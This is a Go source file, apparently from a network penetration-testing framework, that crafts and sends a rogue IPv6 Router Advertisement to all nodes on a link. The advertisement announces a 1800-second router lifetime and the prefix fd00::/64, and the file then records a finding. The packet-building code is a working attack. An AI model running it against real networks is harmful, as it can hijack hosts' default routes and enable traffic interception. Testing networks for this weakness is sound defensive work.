// roguera.go implements the rogue router advertisement attack behavior.
//
// Durability (from the catalog): transient-decay. The attack sends a
// Router Advertisement claiming to be a router with a ~1800s lifetime.
// The RA lifetime decays after the attack stops; no explicit teardown.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type rogueRAFinding struct {
	Action         string `json:"action"`
	RouterLifetime uint16 `json:"router_lifetime"`
	Prefix         string `json:"prefix"`
	DecayNote      string `json:"decay_note"`
}

// RunRogueRA sends a Router Advertisement claiming to be a router with
// a ~1800s lifetime and a prefix announcement.
func RunRogueRA(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()

	pkt, err := craftRogueRA(src)
	if err != nil {
		return fmt.Errorf("roguera: craft RA: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return fmt.Errorf("roguera: send RA: %w", err)
	}

	detail, _ := json.Marshal(rogueRAFinding{
		Action:         "rogue-router-advertisement",
		RouterLifetime: 1800,
		Prefix:         "fd00::/64",
		DecayNote:      "~1800s lifetime announced",
	})
	deps.Emitter.Finding("ra", detail)

	return nil
}

// craftRogueRA builds a Router Advertisement from the rogue router.
func craftRogueRA(src net.HardwareAddr) ([]byte, error) {
	linkLocal := linkLocalFromMAC(src)

	eth := &layers.Ethernet{
		DstMAC:       allNodesMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      linkLocal,
		DstIP:      allNodesIPv6,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeRouterAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	// Prefix info option: prefix fd00::/64, valid 1800s, preferred 1200s.
	prefixData := make([]byte, 30)
	prefixData[0] = 64                                 // prefix length
	prefixData[1] = 0xC0                               // flags: L=1, A=1
	binary.BigEndian.PutUint32(prefixData[2:6], 1200)  // preferred
	binary.BigEndian.PutUint32(prefixData[6:10], 1800) // valid
	copy(prefixData[14:30], net.ParseIP("fd00::").To16())

	ra := &layers.ICMPv6RouterAdvertisement{
		HopLimit:       64,
		Flags:          0,
		RouterLifetime: 1800,
		ReachableTime:  0,
		RetransTimer:   0,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptPrefixInfo,
				Data: prefixData,
			},
			{
				Type: layers.ICMPv6OptSourceAddress,
				Data: src,
			},
		},
	}
	return craftDefault(eth, ip, icmp, ra)
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6RouterAdvertisement)(nil)
